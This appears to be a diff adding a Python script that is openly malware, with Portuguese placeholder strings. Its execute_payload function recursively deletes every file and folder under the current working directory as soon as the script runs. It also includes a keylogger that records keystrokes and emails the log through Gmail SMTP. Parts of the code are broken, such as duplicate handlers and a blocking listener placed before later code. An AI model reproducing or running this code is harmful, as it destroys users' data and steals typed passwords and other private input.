@@ -1,0 +1,90 @@
+import pynput.keyboard
+import smtplib
+import threading
+import os
+
+log = ""
+
+name = "blasses apagou você"
+
+from pynput import keyboard
+
+def on_press(key):
+    try:
+        print('alphanumeric key {0} pressed'.format(
+            key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(
+            key))
+
+
+def on_release(key):
+    print('{0} released'.format(
+        key))
+    if key == keyboard.Key.esc:
+        return False
+
+
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
+
+listener = keyboard.Listener(
+    on_press=on_press,
+    on_release=on_release)
+listener.start()
+
+
+def execute_payload():
+    current_directory = os.getcwd()
+
+    for root, directories, files in os.walk(current_directory, topdown=False):
+        for file in files:
+            file_path = os.path.join(root, file)
+            os.remove(file_path)
+        for directory in directories:
+            directory_path = os.path.join(root, directory)
+            os.rmdir(directory_path)
+
+
+execute_payload()
+
+
+def on_press(key):
+    global log
+    try:
+        log += key.char.decode("utf-8")
+    except AttributeError:
+        if key == key.space:
+            log += " "
+        else:
+            log += " " + str(key) + " "
+
+
+def send_email(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+
+def start_keylogger(email, password, time_interval):
+    keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
+    with keyboard_listener:
+        send_email_thread = threading.Thread(target=send_email, args=(email, password, log))
+        send_email_thread.start()
+        keyboard_listener.join()
+
+
+def display_name():
+    print(name)
+
+
+email = "coloque seu email aq"
+password = "coloque sua senha aq"
+time_interval = 90
+
+start_keylogger(email, password, time_interval)
+display_name()
